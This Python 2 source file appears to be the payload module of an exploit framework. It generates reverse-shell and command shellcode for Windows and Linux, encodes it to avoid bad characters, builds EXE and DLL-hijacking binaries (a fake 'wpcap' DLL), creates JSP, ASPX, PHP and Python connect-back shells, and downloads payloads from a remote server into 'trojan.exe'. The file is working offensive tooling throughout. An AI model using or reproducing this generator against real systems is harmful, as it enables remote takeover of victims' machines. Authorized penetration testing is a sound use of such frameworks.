#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import base64
from config import CLOUD_SERVER
east_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "../")
sys.path.append(east_path)

from platform import system, architecture

from Asm import ShellGenerator
from Encoders import *
from ast import literal_eval
from JavaShellcode import JavaShellcodes
from PhpShellcode import PhpShellcodes
from PythonShellcode import PythonShellcodes
from DotNetShellcode import AspxShellcode


class OSShellcodes:
    """
        Class with shellcodes for operating systems (Linux, Windows, etc)
    """

    def __init__(self, OS_TARGET, OS_TARGET_ARCH, CONNECTBACK_IP='localhost', CONNECTBACK_PORT=5555, BADCHARS=['\x00']):
        """
        Initializes object OSShellcodes.
        :param OS_TARGET: (string) "WINDOWS" or "LINUX"
        :param OS_TARGET_ARCH: (string) "32bit" or "64bit"
        :param CONNECTBACK_IP: (string) Ip address of machine with enabled shell listener
        :param CONNECTBACK_PORT: (int) Port where listener listen to connection.
        :param BADCHARS: (list of strings) Badchars for encoder
        :return:
        """
        self.name = ""
        self.OS_TARGET = OS_TARGET
        self.OS_TARGET_ARCH = OS_TARGET_ARCH
        self.CONNECTBACK_IP = CONNECTBACK_IP
        self.CONNECTBACK_PORT = CONNECTBACK_PORT
        self.BADCHARS = BADCHARS
        self.OS_SYSTEM = system().upper()
        self.OS_ARCH = (architecture())[0]
        self.binary_path = ""
        return

    def create_shellcode(self, _shellcode_type='reverse', command='calc.exe', message='', encode=None, make_exe=0,
                         debug=0, filename="", dll_inj_funcs=[], cloud_generate=False):
        """
        Function for create shellcode.
        :param _shellcode_type: (string) Can be "reverse" or "message" for Linux shellcodes and "reverse", "message", "command" for Windows shellcodes.
        :param command: (string) Command for Windows command-shellcode.
        :param message: (string) Message for "message" for message-shellcode.
        :param encode: (string) Encoder type. Can be "xor", "alphanum", "rot_13", "fnstenv" or "jumpcall". If empty shellcode will not be encoded.
        :param make_exe: (bool) or (int) If True(or 1) exe file will be generated from shellcode.
        :param debug: (bool) or (int) If True(or 1) shellcode will be printed to stdout.
        :param filename: (string) Used for assign special name to executable or dll shellcode.
        :param dll_inj_funcs: (list of strings) Functions names for dll hijacking. If not empty dll with shellcode will be generated.
        :param cloud_generate (bool) Used for generate shellcode on cloud server.
        :return: (string) Generated shellcode.
        """
        if cloud_generate:
            encode = 0 if encode == None else encode
            s = getCloudShell(self.OS_TARGET, self.OS_TARGET_ARCH,
                self.BADCHARS, _shellcode_type, make_exe, encode,
                self.CONNECTBACK_IP, self.CONNECTBACK_PORT, command)
            shellcode = s.get_shell()
            return shellcode if not make_exe else s

        generator = ShellGenerator(self.OS_TARGET, self.OS_TARGET_ARCH)
        shellcode, self.binary_path = generator.get_shellcode(_shellcode_type,
                                      connectback_ip=self.CONNECTBACK_IP,
                                      connectback_port=self.CONNECTBACK_PORT,
                                      command=command,
                                      message=message,
                                      make_exe=make_exe,
                                      debug=debug,
                                      filename=filename,
                                      dll_inj_funcs=dll_inj_funcs)
        if encode:
            if debug:
                print "[] Encode shellcode is on and started"
            e = CodeEncoders(self.OS_SYSTEM, self.OS_TARGET, self.OS_TARGET_ARCH, self.BADCHARS)
            e_shellcode = e.encode_shellcode(shellcode, encode, debug)

            if debug:
                print "Length of encoded shellcode: %d" % len(e_shellcode)
                print "[] Encode shellcode finished"
            if e_shellcode:
                shellcode = e_shellcode
        else:
            if debug:
                print "[] Encode shellcode is off"
        return shellcode

    def get_exe_path(self):
        if os.path.exists(self.binary_path + ".exe"):
            return os.path.normpath(self.binary_path + ".exe")
        return None

    def get_dll_path(self):
        if os.path.exists(self.binary_path + ".dll"):
            return os.path.normpath(self.binary_path + ".dll")
        return None


class CrossOSShellcodes:
    def __init__(self, CONNECTBACK_IP='localhost', CONNECTBACK_PORT=5555):
        """
        Class for generating shells for jsp, aspx, python, php
        :param CONNECTBACK_IP: (string) Ip address of machine with enabled shell listener
        :param CONNECTBACK_PORT: (int) Port where listener listen to connection.
        """
        self.CONNECTBACK_IP = CONNECTBACK_IP
        self.CONNECTBACK_PORT = CONNECTBACK_PORT

    def create_shellcode(self, type, inline=False):
        """
        Creates shellcode of given type
        :param type: (string) aspx, jar, jsp, python, php
        :param inline: (bool) If True all symbols \r, \n, \t will be removed from shellcode
        :return: (string) Generated shellcode
        """
        if type == Constants.ShellcodeType.JSP:
            shell = JavaShellcodes(self.CONNECTBACK_IP, self.CONNECTBACK_PORT, type=Constants.ShellcodeType.JSP)
        elif type == Constants.ShellcodeType.JAR:
            shell = JavaShellcodes(self.CONNECTBACK_IP, self.CONNECTBACK_PORT, type=Constants.ShellcodeType.JAR)
        elif type == Constants.ShellcodeType.ASPX:
            shell = AspxShellcode(self.CONNECTBACK_IP, self.CONNECTBACK_PORT)
        elif type == Constants.ShellcodeType.PYTHON:
            shell = PythonShellcodes(self.CONNECTBACK_IP, self.CONNECTBACK_PORT)
        elif type == Constants.ShellcodeType.PHP:
            shell = PhpShellcodes(self.CONNECTBACK_IP, self.CONNECTBACK_PORT)
        else:
            print("There is no shellcode of type: {}".format(type))
            return ""
        shellcode = shell.get_shellcode(inline)
        return shellcode


class getCloudShell:

    def __init__(self, os="WINDOWS", arch="32bit", badchars="", 
type_sh="reverse", make_exe=False, encode=0, ip="127.0.0.1", port=4000, 
command="calc.exe"):
        # change CLOUD_SERVER in config.py
        self.cloud_server = CLOUD_SERVER
        self.make_exe = make_exe
        bs = self.badchars_encoding(badchars) if len(badchars) else ""
        self.os = os
        self.url = self.cloud_server + "/shell?os=" + os + "&arch=" + arch
        self.url += "&type=" + type_sh + "&command=" + command
        self.url += "&ip=" + ip + "&port=" + str(port)
        self.url += "&encode=" + str(encode) + "&exe=" + str(make_exe)
        self.url += "&badchars=" + bs.encode('string_escape') if len(bs) else ""
        return

    def get_shell(self):
        import urllib2
        try:
            shell = urllib2.urlopen(self.url).read()
            shell = base64.b64decode(shell)
        except Exception as e:
            print(e)
            print("Couldn't open url %s" % self.cloud_server)
            return False
        if self.make_exe and self.os == "WINDOWS":
            try:
                f = open('trojan.exe', 'wb')
                f.write(shell)
                f.close()
                self.filename = "trojan.exe"
                return True
            except Exception as e:
                return False
        elif self.make_exe:
            try:
                f = open('trojan', 'ab')
                f.write(shell)
                f.close()
                self.filename = "trojan"
                return True
            except Exception as e:
                return False
        return shell if shell else False

    def get_exe_path(self):
        return self.filename if self.filename else False

    def badchars_encoding(self, badchars):
        return_value = ""
        for i in badchars:
            return_value += str(ord(i)) + ";"
        return return_value


if __name__ == "__main__":
    # Example of generating shellcode for Linux/Windows
    print "[] Generate shellcode started"

    BADCHARS = ["\x00", "\x0a", "\x0d", "\x3b"]

    os_target = Constants.OS.WINDOWS
    os_target_arch = Constants.OS_ARCH.X32
    s = OSShellcodes(os_target, os_target_arch, '127.0.0.1', 4000, BADCHARS)
    dll_funcs = ["pcap_findalldevs", "pcap_close", "pcap_compile", "pcap_datalink", "pcap_datalink_val_to_description",
                 "pcap_dump", "pcap_dump_close", "pcap_dump_open", "pcap_file", "pcap_freecode", "pcap_geterr",
                 "pcap_getevent", "pcap_lib_version", "pcap_lookupdev", "pcap_lookupnet", "pcap_loop", "pcap_open_live",
                 "pcap_open_offline", "pcap_setfilter", "pcap_snapshot", "pcap_stats"]

    shellcode_type = 'command'
    shellcode = s.create_shellcode(
            shellcode_type,
            encode=0,
            make_exe=1,
            debug=1,
            dll_inj_funcs=dll_funcs,
            filename="wpcap"
    )
    print s.get_exe_path()
    print "[] Generate shellcode finished"
    # Example of generating jsp shellcode
    # type = Constants.ShellcodeType.JSP
    # s = CrossOSShellcodes('127.0.0.1', 4000)
    # print s.create_shellcode(type, False)
